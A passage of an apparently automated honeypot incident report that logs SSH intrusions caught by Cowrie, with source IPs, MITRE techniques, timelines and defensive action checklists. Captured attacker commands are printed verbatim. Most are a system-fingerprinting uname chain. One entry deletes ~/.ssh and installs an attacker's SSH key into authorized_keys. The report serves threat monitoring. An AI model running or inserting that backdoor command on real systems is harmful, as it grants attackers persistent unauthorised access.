| `2026-09-01 15:31:53` | `cowrie.client.version` |
| `2026-09-01 15:31:53` | `cowrie.client.kex` |
| `2026-09-01 15:31:53` | `cowrie.login.success` |
| `2026-09-01 15:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bcdeb3521b4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:32 |
| **Last Seen** | 2026-09-01 15:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:32:23` | `cowrie.session.connect` |
| `2026-09-01 15:32:24` | `cowrie.client.version` |
| `2026-09-01 15:32:24` | `cowrie.client.kex` |
| `2026-09-01 15:32:25` | `cowrie.login.success` |
| `2026-09-01 15:32:26` | `cowrie.session.params` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.success` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:26` | `cowrie.command.input` |
| `2026-09-01 15:32:27` | `cowrie.log.closed` |
| `2026-09-01 15:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2122d577461e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:32 |
| **Last Seen** | 2026-09-01 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:32:34` | `cowrie.session.connect` |
| `2026-09-01 15:32:34` | `cowrie.client.version` |
| `2026-09-01 15:32:34` | `cowrie.client.kex` |
| `2026-09-01 15:32:35` | `cowrie.login.success` |
| `2026-09-01 15:32:35` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:32:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:32:35` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1be88202d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:34 |
| **Last Seen** | 2026-09-01 15:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:34:10` | `cowrie.session.connect` |
| `2026-09-01 15:34:10` | `cowrie.client.version` |
| `2026-09-01 15:34:10` | `cowrie.client.kex` |
| `2026-09-01 15:34:12` | `cowrie.login.success` |
| `2026-09-01 15:34:14` | `cowrie.session.params` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.success` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:14` | `cowrie.command.input` |
| `2026-09-01 15:34:15` | `cowrie.log.closed` |
| `2026-09-01 15:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e27387797f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:35 |
| **Last Seen** | 2026-09-01 15:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:35:59` | `cowrie.session.connect` |
| `2026-09-01 15:35:59` | `cowrie.client.version` |
| `2026-09-01 15:35:59` | `cowrie.client.kex` |
| `2026-09-01 15:36:01` | `cowrie.login.success` |
| `2026-09-01 15:36:02` | `cowrie.session.params` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.success` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.command.input` |
| `2026-09-01 15:36:02` | `cowrie.log.closed` |
| `2026-09-01 15:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1507a944f449

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:36 |
| **Last Seen** | 2026-09-01 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:36:42` | `cowrie.session.connect` |
| `2026-09-01 15:36:42` | `cowrie.client.version` |
| `2026-09-01 15:36:42` | `cowrie.client.kex` |
| `2026-09-01 15:36:43` | `cowrie.login.success` |
| `2026-09-01 15:36:43` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:36:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:36:44` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333b36486f1c

| Field | Detail |
|---|---|
| **Source IP** | `207.180.233[.]98` |
| **First Seen** | 2026-09-01 15:36 |
| **Last Seen** | 2026-09-01 15:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:36:50` | `cowrie.session.connect` |
| `2026-09-01 15:36:50` | `cowrie.client.version` |
| `2026-09-01 15:36:50` | `cowrie.client.kex` |
| `2026-09-01 15:36:51` | `cowrie.login.success` |
| `2026-09-01 15:36:52` | `cowrie.session.params` |
| `2026-09-01 15:36:52` | `cowrie.command.input` |
| `2026-09-01 15:36:52` | `cowrie.command.failed` |
| `2026-09-01 15:36:52` | `cowrie.log.closed` |
| `2026-09-01 15:36:53` | `cowrie.session.params` |
| `2026-09-01 15:36:53` | `cowrie.command.input` |
| `2026-09-01 15:36:53` | `cowrie.session.file_download` |
| `2026-09-01 15:36:53` | `cowrie.log.closed` |
| `2026-09-01 15:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.233[.]98` to AbuseIPDB if not already reported
- [ ] Block `207.180.233[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2c5adcf51d

| Field | Detail |
|---|---|
| **Source IP** | `207.180.233[.]98` |
| **First Seen** | 2026-09-01 15:36 |
| **Last Seen** | 2026-09-01 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:36:53` | `cowrie.session.connect` |
| `2026-09-01 15:36:53` | `cowrie.client.version` |
| `2026-09-01 15:36:53` | `cowrie.client.kex` |
| `2026-09-01 15:36:54` | `cowrie.login.success` |
| `2026-09-01 15:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.233[.]98` to AbuseIPDB if not already reported
- [ ] Block `207.180.233[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420c9d07e850

| Field | Detail |
|---|---|
| **Source IP** | `207.180.233[.]98` |
| **First Seen** | 2026-09-01 15:36 |
| **Last Seen** | 2026-09-01 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:36:54` | `cowrie.session.connect` |
| `2026-09-01 15:36:54` | `cowrie.client.version` |
| `2026-09-01 15:36:54` | `cowrie.client.kex` |
| `2026-09-01 15:36:54` | `cowrie.login.success` |
| `2026-09-01 15:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.233[.]98` to AbuseIPDB if not already reported
- [ ] Block `207.180.233[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89d65a6a14b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:37 |
| **Last Seen** | 2026-09-01 15:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:37:44` | `cowrie.session.connect` |
| `2026-09-01 15:37:44` | `cowrie.client.version` |
| `2026-09-01 15:37:44` | `cowrie.client.kex` |
| `2026-09-01 15:37:46` | `cowrie.login.success` |
| `2026-09-01 15:37:47` | `cowrie.session.params` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.success` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.command.input` |
| `2026-09-01 15:37:47` | `cowrie.log.closed` |
| `2026-09-01 15:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1087235c43b2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:39 |
| **Last Seen** | 2026-09-01 15:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:39:31` | `cowrie.session.connect` |
| `2026-09-01 15:39:31` | `cowrie.client.version` |
| `2026-09-01 15:39:31` | `cowrie.client.kex` |
| `2026-09-01 15:39:33` | `cowrie.login.success` |
| `2026-09-01 15:39:34` | `cowrie.session.params` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.success` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:34` | `cowrie.command.input` |
| `2026-09-01 15:39:35` | `cowrie.log.closed` |
| `2026-09-01 15:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0d8755af2f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:41 |
| **Last Seen** | 2026-09-01 15:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:41:18` | `cowrie.session.connect` |
| `2026-09-01 15:41:19` | `cowrie.client.version` |
| `2026-09-01 15:41:19` | `cowrie.client.kex` |
| `2026-09-01 15:41:20` | `cowrie.login.success` |
| `2026-09-01 15:41:22` | `cowrie.session.params` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.success` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.command.input` |
| `2026-09-01 15:41:22` | `cowrie.log.closed` |
| `2026-09-01 15:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7c0abbb640

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:42 |
| **Last Seen** | 2026-09-01 15:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:42:57` | `cowrie.session.connect` |
| `2026-09-01 15:42:58` | `cowrie.client.version` |
| `2026-09-01 15:42:58` | `cowrie.client.kex` |
| `2026-09-01 15:43:00` | `cowrie.login.success` |
| `2026-09-01 15:43:01` | `cowrie.session.params` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.success` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:01` | `cowrie.command.input` |
| `2026-09-01 15:43:02` | `cowrie.log.closed` |
| `2026-09-01 15:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8927e471cd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:43 |
| **Last Seen** | 2026-09-01 15:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:43:10` | `cowrie.session.connect` |
| `2026-09-01 15:43:10` | `cowrie.client.version` |
| `2026-09-01 15:43:10` | `cowrie.client.kex` |
| `2026-09-01 15:43:11` | `cowrie.login.success` |
| `2026-09-01 15:43:11` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:43:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:43:11` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e630f941d354

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:44 |
| **Last Seen** | 2026-09-01 15:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:44:40` | `cowrie.session.connect` |
| `2026-09-01 15:44:40` | `cowrie.client.version` |
| `2026-09-01 15:44:40` | `cowrie.client.kex` |
| `2026-09-01 15:44:42` | `cowrie.login.success` |
| `2026-09-01 15:44:43` | `cowrie.session.params` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.success` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:43` | `cowrie.command.input` |
| `2026-09-01 15:44:44` | `cowrie.log.closed` |
| `2026-09-01 15:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390ef650c974

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:45 |
| **Last Seen** | 2026-09-01 15:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:45:55` | `cowrie.session.connect` |
| `2026-09-01 15:45:55` | `cowrie.client.version` |
| `2026-09-01 15:45:56` | `cowrie.client.kex` |
| `2026-09-01 15:45:56` | `cowrie.login.success` |
| `2026-09-01 15:45:57` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:45:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:45:57` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e12d03e371

| Field | Detail |
|---|---|
